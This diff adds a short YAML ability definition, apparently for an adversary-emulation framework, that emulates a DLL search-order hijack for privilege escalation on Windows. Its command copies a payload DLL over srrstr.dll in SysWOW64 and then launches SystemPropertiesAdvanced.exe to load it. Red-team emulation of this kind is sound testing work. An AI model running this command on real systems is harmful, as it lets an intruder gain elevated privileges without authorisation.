@@ -1,0 +1,33 @@
+ability_id: ab48e12f-def0-40a4-b3d9-ad958f45202a
+access: {}
+additional_info: {}
+buckets:
+- hijack-execution-flow---dll-search-order-hijacking
+delete_payload: true
+description: Perform DLL hijack to escalate privileges.
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: 'robocopy BOOSTWRITE.dll C:\\Windows\\Syswow64\\srrstr.dll &&
+
+    cmd.exe /c "C:\\Windows\\Syswow64\\SystemPropertiesAdvanced.exe"'
+  language: null
+  name: cmd
+  parsers: []
+  payloads:
+  - BOOSTWRITE.dll
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Privilege Escalation
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: hijack-execution-flow---dll-search-order-hijacking
+technique_id: T1574.001
+technique_name: Hijack Execution Flow - DLL Search Order Hijacking
